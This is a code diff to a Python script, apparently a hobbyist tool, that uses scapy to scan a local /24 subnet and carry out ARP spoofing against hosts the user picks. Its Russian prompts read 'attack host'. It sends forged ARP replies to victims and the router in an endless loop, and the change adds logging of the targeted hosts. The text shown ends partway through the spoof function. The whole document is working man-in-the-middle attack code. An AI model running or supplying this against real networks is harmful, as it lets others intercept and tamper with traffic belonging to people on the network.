@@ -1,28 +1,31 @@
 #!/usr/bin/env python
 import scapy.all as scapy
 import scan
+import log
 import time
 
 def getResScan(routerIp):
 	for item in scan.scan(routerIp + "/24"):
-		inChoice = input("[!] Атаковать хост " + item["ip"] + "/" + item["mac"] + " (y/n?)")
-		if inChoice == "y":
-			try:
-				dot = " "
-				while True:
-					spoof(item["ip"], routerIp, item["mac"])
-					spoof(routerIp, item["ip"], item["mac"])
-					if len(dot) >= 5:
-						dot = " "
-					else:
-						dot = dot + "."
-					print("\r[*] Отправка пакетов" + dot, end=" ")
-					time.sleep(2)
-			except KeyboardInterrupt:
-				print("\n[!] Востановление ARP-таблицы")	
-				restore(item["ip"], routerIp, item["mac"])
-				restore(routerIp, item["ip"], item["mac"])
-				getResScan(routerIp)
+		if routerIp != item["ip"]:
+			inChoice = input("[!] Атаковать хост " + item["ip"] + "/" + item["mac"] + " (y/n?)")
+			if inChoice == "y":
+				log.logScan(item["ip"], item["mac"])
+				try:
+					dot = " "
+					while True:
+						spoof(item["ip"], routerIp, item["mac"])
+						spoof(routerIp, item["ip"], item["mac"])
+						if len(dot) >= 5:
+							dot = " "
+						else:
+							dot = dot + "."
+						print("\r[*] Отправка пакетов" + dot, end=" ")
+						time.sleep(2)
+				except KeyboardInterrupt:
+					print("\n[!] Востановление ARP-таблицы")	
+					restore(item["ip"], routerIp, item["mac"])
+					restore(routerIp, item["ip"], item["mac"])
+					getResScan(routerIp)
 			
 def spoof(targetIp, routerIp, targetMac):
 	packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=routerIp)
